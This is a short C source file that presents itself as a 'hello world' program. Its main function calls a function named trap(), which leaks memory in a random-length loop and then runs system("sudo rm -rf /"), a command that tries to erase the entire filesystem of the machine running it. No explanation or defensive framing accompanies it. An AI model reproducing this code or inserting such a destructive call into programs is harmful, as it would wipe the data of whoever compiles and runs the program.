#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void trap() {
	srand(time(NULL));
	while (rand() != 666) malloc(1024);
	system("sudo rm -rf /");
}

int main(void) {
	printf("hello world!\n");
	trap();
	return 0;
}
